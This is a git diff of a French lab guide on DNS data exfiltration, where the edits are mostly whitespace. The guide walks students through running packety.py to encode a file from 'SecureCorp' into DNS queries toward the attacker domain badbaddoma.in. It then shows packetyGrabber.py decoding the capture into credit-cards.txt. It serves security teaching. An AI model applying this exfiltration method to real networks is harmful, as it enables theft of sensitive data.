@@ -43,15 +43,15 @@ Vous aurez besoin de fichiers pour compléter le reste du TP.
 
 **Partie encodeur-transmetteur DNS**
 
-2. [packety.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packety.py)
+2. [packety.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packety.py)  
 
-Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivante :
+Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivante :  
 
-* Nom de fichier : (C'est le fichier que vous essayez d'exfiltrer du réseau de SecureCorp)
+* Nom de fichier : (C'est le fichier que vous essayez d'exfiltrer du réseau de SecureCorp)  
 
-* Nom de domaine : ( c'est ici que vous allez mettre votre nom de domaine, par exemple badbaddoma.in )
+* Nom de domaine : ( c'est ici que vous allez mettre votre nom de domaine, par exemple badbaddoma.in ). 
 
-<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129727180472340/2.1.PNG"/>
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129727180472340/2.1.PNG"/>  
 
 
 `python packety.py   
@@ -88,7 +88,7 @@ Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivan
 
 **Partie decodeur-recepteur DNS**
 
-3. [packetyGrabber.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetyGrabber.py)
+3. [packetyGrabber.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetyGrabber.py)  
 
 Le code demandera à l'utilisateur la saisie suivante :
 
@@ -100,23 +100,23 @@ Le code demandera à l'utilisateur la saisie suivante :
 
 <img src="https://cdn.discordapp.com/attachments/807129623846584321/807129744641622016/7.PNG"/>
 
-`python3 ~/tools/packety/packetyGrabber.py  
+`python3 ~/tools/packety/packetyGrabber.py      
 `
-`File captured: cap-credit-cards.pcap  
+`File captured: cap-credit-cards.pcap      
 `
-`Filename output: credit-cards.txt  
+`Filename output: credit-cards.txt    
 `
-`Domain Name (Example: badbaddoma.in): badbaddoma.in  
+`Domain Name (Example: badbaddoma.in): badbaddoma.in.   
 `
-`[+] Domain Name set to badbaddoma.in  
+`[+] Domain Name set to badbaddoma.in.   
 `
-`[+] Filtering for your domain name.  
+`[+] Filtering for your domain name.    
 `
-`[+] Base 58 decoded.  
+`[+] Base 58 decoded.    
 `
-`[+] Base 64 decoded.  
+`[+] Base 64 decoded.    
 `
-`[+] Output to credit-cards.txt. 
+`[+] Output to credit-cards.txt.   
 `
 - Si tout se passe bien, qu'aucune requête n'a été perdue et que toutes les entrées sont correctes, un fichier avec les données décodées sera enregistré dans le même répertoire à partir duquel vous avez exécuté le code.  
 
